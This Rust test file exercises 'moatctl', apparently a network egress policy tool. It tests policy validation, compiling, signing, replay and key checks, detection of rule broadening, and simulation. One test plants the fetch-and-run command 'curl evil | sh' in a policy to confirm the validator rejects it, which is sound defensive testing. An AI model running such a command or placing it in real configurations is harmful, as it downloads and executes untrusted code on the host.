//! End-to-end tests of the moatctl binary.

use std::fs;
use std::path::{Path, PathBuf};
use std::process::{Command, Output};

fn bin() -> Command {
    Command::new(env!("CARGO_BIN_EXE_moatctl"))
}
fn repo() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR")).join("../..")
}
fn home() -> PathBuf {
    repo().join("conformance/policies/home.toml")
}
fn run(args: &[&str]) -> Output {
    bin().args(args).output().expect("runs")
}
fn s(o: &Output) -> String {
    String::from_utf8_lossy(&o.stdout).to_string() + &String::from_utf8_lossy(&o.stderr)
}

#[test]
fn validate_reports_per_adapter() {
    let o = run(&["validate", home().to_str().unwrap()]);
    assert!(o.status.success(), "{}", s(&o));
    let t = s(&o);
    assert!(t.contains("is valid"));
    assert!(t.contains("omitted coding-allow-github"), "{t}");
    let o = run(&["--json", "validate", home().to_str().unwrap(), "--adapter", "linux"]);
    let v: serde_json::Value = serde_json::from_slice(&o.stdout).unwrap();
    assert_eq!(v["ok"], true);
    assert_eq!(v["adapters"].as_array().unwrap().len(), 1);
}

#[test]
fn validate_rejects_scripts_and_unknown_fields() {
    let d = tempfile::tempdir().unwrap();
    let p = d.path().join("bad.toml");
    let mut t = fs::read_to_string(home()).unwrap();
    t = t.replacen("[[rules]]\n", "[[rules]]\nexec = \"curl evil | sh\"\n", 1);
    fs::write(&p, t).unwrap();
    let o = run(&["validate", p.to_str().unwrap()]);
    assert!(!o.status.success());
    assert!(s(&o).contains("exec"), "{}", s(&o));
}

#[test]
fn strict_policy_fails_ip_only_linux_compile_but_compiles_with_the_session_proxy() {
    let strict = repo().join("conformance/policies/home-strict.toml");
    let o = run(&["validate", strict.to_str().unwrap(), "--adapter", "linux-ip-only"]);
    assert_eq!(o.status.code(), Some(2), "{}", s(&o));
    assert!(s(&o).contains("DOES NOT COMPILE"));
    let o = run(&["validate", strict.to_str().unwrap(), "--adapter", "linux"]);
    assert!(o.status.success(), "{}", s(&o));
    let udp = repo().join("conformance/policies/home-proxy-udp-deny.toml");
    let o = run(&["validate", udp.to_str().unwrap(), "--adapter", "linux"]);
    assert_eq!(o.status.code(), Some(2), "{}", s(&o));
    assert!(s(&o).contains("TCP only"), "{}", s(&o));
}

#[test]
fn keygen_compile_sign_verify_and_replay() {
    let d = tempfile::tempdir().unwrap();
    let key = d.path().join("signer.key");
    let o = run(&["keygen", "--out", key.to_str().unwrap()]);
    assert!(o.status.success(), "{}", s(&o));
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        assert_eq!(fs::metadata(&key).unwrap().permissions().mode() & 0o777, 0o600);
    }
    // refuses to overwrite
    assert!(!run(&["keygen", "--out", key.to_str().unwrap()]).status.success());
    let snap = d.path().join("snap.json");
    let o = run(&[
        "compile",
        home().to_str().unwrap(),
        "--adapter",
        "linux",
        "--revision",
        "7",
        "--valid-hours",
        "24",
        "-o",
        snap.to_str().unwrap(),
    ]);
    assert!(o.status.success(), "{}", s(&o));
    let signed = d.path().join("signed.json");
    let o = run(&["sign", snap.to_str().unwrap(), "--key", key.to_str().unwrap(), "-o", signed.to_str().unwrap()]);
    assert!(o.status.success(), "{}", s(&o));
    let pubk = format!("{}.pub", key.display());
    let o = run(&["verify", signed.to_str().unwrap(), "--pub", &pubk, "--adapter", "linux"]);
    assert!(o.status.success(), "{}", s(&o));
    assert!(s(&o).contains("revision 7"));
    // replay
    let o = run(&["verify", signed.to_str().unwrap(), "--pub", &pubk, "--adapter", "linux", "--last-applied", "7"]);
    assert_eq!(o.status.code(), Some(2));
    assert!(s(&o).contains("replay") || s(&o).contains("Replay") || s(&o).contains("revision"), "{}", s(&o));
    // wrong platform
    let o = run(&["verify", signed.to_str().unwrap(), "--pub", &pubk, "--adapter", "macos"]);
    assert_eq!(o.status.code(), Some(2));
    // untrusted key
    let other = d.path().join("other.key");
    run(&["keygen", "--out", other.to_str().unwrap()]);
    let o = run(&["verify", signed.to_str().unwrap(), "--pub", &format!("{}.pub", other.display()), "--adapter", "linux"]);
    assert_eq!(o.status.code(), Some(2));
}

fn broadened(d: &Path) -> PathBuf {
    let p = d.join("broad.toml");
    let t = fs::read_to_string(home()).unwrap()
        + "\n[[rules]]\nid = \"coding-allow-pastebin\"\naction = \"allow\"\nselector = { session = { profiles = [\"coding-session\"] } }\ndestinations = { cidrs = [\"203.0.113.0/24\"] }\nprovenance = { kind = \"git\", reference = \"test\" }\n";
    fs::write(&p, t).unwrap();
    p
}

#[test]
fn diff_flags_broadening_and_sign_requires_owner() {
    let d = tempfile::tempdir().unwrap();
    let b = broadened(d.path());
    let o = run(&["diff", home().to_str().unwrap(), b.to_str().unwrap()]);
    assert_eq!(o.status.code(), Some(3), "{}", s(&o));
    assert!(s(&o).contains("BROADENS"));
    // narrowing direction is not broadening
    let o = run(&["diff", b.to_str().unwrap(), home().to_str().unwrap()]);
    assert_eq!(o.status.code(), Some(0), "{}", s(&o));

    let key = d.path().join("k");
    run(&["keygen", "--out", key.to_str().unwrap()]);
    let snap = d.path().join("snap.json");
    assert!(run(&["compile", b.to_str().unwrap(), "--adapter", "macos", "--revision", "2", "-o", snap.to_str().unwrap()]).status.success());
    let o = run(&["sign", snap.to_str().unwrap(), "--key", key.to_str().unwrap(), "--previous", home().to_str().unwrap()]);
    assert_eq!(o.status.code(), Some(3), "{}", s(&o));
    let o = run(&[
        "sign",
        snap.to_str().unwrap(),
        "--key",
        key.to_str().unwrap(),
        "--previous",
        home().to_str().unwrap(),
        "--authorize-broadening",
    ]);
    assert!(o.status.success(), "{}", s(&o));
}

#[test]
fn simulate_and_explain() {
    let d = tempfile::tempdir().unwrap();
    let case: serde_json::Value =
        serde_json::from_str(&fs::read_to_string(repo().join("conformance/cases/policy/coding-unknown-egress-denied.json")).unwrap())
            .unwrap();
    let flow = d.path().join("flow.json");
    fs::write(&flow, case["flow"].to_string()).unwrap();
    let o = run(&["explain", home().to_str().unwrap(), "--flow", flow.to_str().unwrap()]);
    assert!(o.status.success(), "{}", s(&o));
    assert!(s(&o).contains("blocked"), "{}", s(&o));

    let obs = d.path().join("obs.jsonl");
    fs::write(&obs, format!("{}\n", case["flow"])).unwrap();
    let b = broadened(d.path());
    let o = run(&[
        "--json",
        "simulate",
        home().to_str().unwrap(),
        b.to_str().unwrap(),
        "--observations",
        obs.to_str().unwrap(),
        "--unacknowledged",
        "mini",
    ]);
    assert!(o.status.success(), "{}", s(&o));
    let v: serde_json::Value = serde_json::from_slice(&o.stdout).unwrap();
    assert_eq!(v["observations"], 1);
    assert_eq!(v["newly_allowed"], 1);
    assert!(v["disclaimer"].as_str().unwrap().contains("estimate"));
    assert_eq!(v["unacknowledged_devices"][0], "mini");
}

#[test]
fn conformance_command_passes() {
    let o = run(&["conformance", repo().join("conformance").to_str().unwrap()]);
    assert!(o.status.success(), "{}", s(&o));
    assert!(s(&o).contains("0 failed"));
}

#[test]
fn normalize_prints_policy_json() {
    let o = run(&["normalize", home().to_str().unwrap()]);
    assert!(o.status.success(), "{}", s(&o));
    let v: serde_json::Value = serde_json::from_slice(&o.stdout).unwrap();
    assert_eq!(v["schema"], "moat.policy.v1");
    assert!(v["rules"].as_array().unwrap().len() >= 5);
}

#[test]
fn compile_with_grants_keeps_device_scope_and_binds_the_overlay() {
    let d = tempfile::tempdir().unwrap();
    let policy = moat_core::Policy::parse(&fs::read_to_string(home()).unwrap()).unwrap();
    let mut g: serde_json::Value =
        serde_json::from_str(&fs::read_to_string(repo().join("contracts/fixtures/valid/grant-task.json")).unwrap()).unwrap();
    g["base_policy_digest"] = serde_json::Value::String(format!("sha256:{}", moat_core::compile::policy_digest(&policy)));
    let gp = d.path().join("grants.json");
    fs::write(&gp, serde_json::to_string(&vec![g]).unwrap()).unwrap();
    let hp = home();
    let args = ["compile", hp.to_str().unwrap(), "--adapter", "linux", "--revision", "3", "--issued-at", "2026-10-27T15:01:00Z"];
    let plain = run(&args);
    assert!(plain.status.success(), "{}", s(&plain));
    let o = bin().args(args).args(["--grants", gp.to_str().unwrap()]).output().unwrap();
    assert!(o.status.success(), "{}", s(&o));
    let snap: serde_json::Value = serde_json::from_slice(&o.stdout).unwrap();
    let rule = snap["policy"]["rules"].as_array().unwrap().iter().find(|r| r["id"] == "grant-01j0").expect("grant rule present").clone();
    assert_eq!(rule["selector"]["devices"], serde_json::json!(["arch-desk"]));
    assert_eq!(rule["selector"]["session"]["session_ids"], serde_json::json!(["20261027150000-a1b2c3d4e5f6"]));
    let plain: serde_json::Value = serde_json::from_slice(&plain.stdout).unwrap();
    assert_ne!(snap["report"]["effective_digest"], plain["report"]["effective_digest"], "overlay is in the effective digest");
    // a grant missing its device scope is refused, not compiled wider
    let mut bad: serde_json::Value = serde_json::from_str(&fs::read_to_string(&gp).unwrap()).unwrap();
    bad[0]["scope"].as_object_mut().unwrap().remove("device_id");
    fs::write(&gp, bad.to_string()).unwrap();
    let o = bin().args(args).args(["--grants", gp.to_str().unwrap()]).output().unwrap();
    assert_eq!(o.status.code(), Some(2), "{}", s(&o));
}
